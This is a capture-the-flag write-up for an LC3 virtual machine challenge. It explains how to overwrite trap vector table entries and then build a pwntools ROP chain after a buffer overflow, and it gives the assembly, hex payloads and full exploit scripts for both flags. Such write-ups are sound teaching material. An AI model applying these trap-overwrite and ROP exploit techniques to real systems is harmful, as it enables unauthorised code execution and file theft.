# Write up for Legacy

## Overview

For this challenge we are doing some trap vector overwriting and some Return Oriented Programming (ROP). For this challenge, we have a lc3 VM and we are
trying to get 2 flags from the host. We can send in machine code to be run, but it'll only read and run by the VM. The host machine won't execute code
from the location we can write to (the stack of the VM). For this challgenge we will use:

lc3 ISA: https://www.jmeiners.com/lc3-vm/supplies/lc3-isa.pdf

lc3 Assembler and Simulator: https://courses.grainger.illinois.edu/ece220/sp2020/lc3web/index.html

x86-64 Syscall table: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/


## Solution

### Flag 1

The first flag is very similar to the previous challenge ```lttlvmmy```. The VM has a depricated function ```trap_sendfile_deprecated()```
that sends the first flag if run. We can overwrite the Trap Vector Table with the address of the function, then call the trap to activate the function.
The below assembly does this

```asm
.ORIG x1000

        ; R0 <- 4 * TRAP_HALT (#37)
        LD   R0, TP_HALTVEC    ; R0 = 37
        ADD  R0, R0, R0        ; R0 = 2*37
        ADD  R0, R0, R0        ; R0 = 4*37 = 37 << 2 = 148

        ; R1 <- 0x2343
        LD   R1, L16_SF_DEP

        ; MEM[148] <- 0x2343
        : Overwrite TRAP 0x25 (HALT) with trap_sendfile_deprecated
        STR  R1, R0, #0

        ; run TRAP x25 (now trap_sendfile_deprecated)
        TRAP x25

        ; Run HALT (which will run trap x25 again)
        HALT

; 0x25 in decimal
TP_HALTVEC    .FILL #37
; lower 16 bits of 0x402343 (trap_sendfile_deprecated addr)
L16_SF_DEP    .FILL x2343
.END
```
Which we can then assemble with the lc3 assembler and put it into a solution script, getting us the flag.

```Python
#!/usr/bin/env python3

from pwn import *
context.terminal = ['tmux', 'split']

p = remote("REDACTED", REDACTED)
# p = process("./vm")

print(p.recvline())

# Flag 1
# Compiled from https://courses.grainger.illinois.edu/ece220/sp2020/lc3web/index.html
payload = bytes.fromhex(
    '10 00' # .ORIG 3000
    '20 06' # LD R0, TP_HALTVEC
    '10 00' # ADD R0, R0, R0
    '10 00' # ADD R0, R0, R0 ( = to TP_HALTVEC*4 shifts over 2 bits)
    '22 04' # LD R1, NEW_LOW16
    '72 00' # STR R1, R0, #0
    'F0 25' # HALT
    'F0 25' # HALT
    '00 25' # (TP_HALTVEC)
    '23 43' # LD R1, x0F4C (NEW_LOW16)
)

# Send buffer size to be sufficient space
p.sendline(str(len(payload)).encode())
p.send(payload)

p.interactive()
```


### Flag 2

For flag 2, we want to get the ```flag2``` file we saw loaded in the docker image. Similar to flag 1, we want
to overwrite one of the Trap Vector Table Entries, though this time we'll overwrite trap ```0x20``` (GETC) with
the ```buffer_overflow_admin_only()``` function. This will allow us to perform a buffer overflow and control
the stack. From this, although we can't write code that'll be executed, we can use Return Oriented Programming (ROP) to
run the syscalls ```sys_open``` and ```sys_sendfile``` to get the flag.

After running the function allowing a buffer overflow the same way we ran the depricated function, we can 
create our ROP attack using pwntools ROP function, which can read through a binary files, find "Gadgets" to
execute the assembly we want and combine them to make our attack. Gadgets are locations in program memory with the
command we want to execute immediately follwoed by a ```ret```. Allowing us to jump there and chain together commands
to get the code we want. The implementation of this can be seen below

```Python
context.binary = vm = ELF('./vm')
rop = ROP(vm)
rop.rax = 2 # syscall 2, open
rop.rdi = flag2_str_addr + 1 # flag2 string location
rop.rsi = 0 # read only mode
rop.rdx = 0 # unused
rop.raw(rop.find_gadget(["syscall","ret"]))
rop.rax = 40 # syscall 40, sendfile
rop.rdi = 1 # stdout
rop.rsi = 3 # opened file
rop.rdx = 0 # no offset
rop.r10 = 20 # copy 20 characters
rop.raw(rop.find_gadget(["syscall","ret"]))
```

After creating our ROP attack, we buffer overflow and put the start of out ROP attack at the return address of the 
```buffer_overflow_admin_only()``` function. This allows us to run the 2 syscalls to get the second flag. 
This can be seen in the solution script below.

```Python
#!/usr/bin/env python3

from pwn import *
context.terminal = ['tmux', 'split']
context.clear(arch="amd64")

p = remote("REDACTED", REDACTED)
# p = process("./vm")

print(p.recvline())

# Compiled from https://courses.grainger.illinois.edu/ece220/sp2020/lc3web/index.html
# Overwrite TRAP x20 GETC to buffer_overflow_admin_only() and run it
# in order to get to a buffer overflowable location
payload = bytes.fromhex(
    '10 00' # .ORIG 1000
    '20 06' # LD R0, TP_GETCVEC
    '10 00' # ADD R0, R0, R0
    '10 00' # ADD R0, R0, R0 ( = to TP_HALTVEC*4 shifts over 2 bits)
    '22 04' # LD R1, NEW_LOW16
    '72 00' # STR R1, R0, #0
    'F0 20' # GETC (now buffer_overflow_admin_only())
    'F0 25' # HALT
    '00 20' # (TP_GETCVEC)
    '23 9B' # LD R1, x0F4C (NEW_LOW16)
    '00 00' # NULL terminator
)

# Send buffer size to be sufficient space for payload
p.sendline(str(len(payload)).encode())
p.send(payload)

# Get the address for the "flag2" string
# in the buffer for the ROP attack
print(p.recvline())
print(p.recvline())
print(p.recvline())
resp1 = p.recvline()
print(resp1)
flag2_str_addr = int(resp1.split(b":")[0], 16)

# Set up stack ROP payload
# that we will overwrite the stack with 
context.binary = vm = ELF('./vm')
rop = ROP(vm)
rop.rax = 2 # syscall 2, open
rop.rdi = flag2_str_addr + 1 # flag2 string location
rop.rsi = 0 # read only mode
rop.rdx = 0 # unused
rop.raw(rop.find_gadget(["syscall","ret"]))
rop.rax = 40 # syscall 40, sendfile
rop.rdi = 1 # stdout
rop.rsi = 3 # opened file
rop.rdx = 0 # no offset
rop.r10 = 20 # copy 20 characters
rop.raw(rop.find_gadget(["syscall","ret"]))

# Get the correct offset for the ROP attack
# and then repeat payload to ensure it hits the 
# return address

# Offset can be found with trial and error 
# or by automatically adding more characters it till segfaults
# on the local system and storing the result.
code = b'flag2\x00' + (b"a" * 250) + (b"a" * 7) + rop.chain()*300

p.send(code)

p.interactive()
```




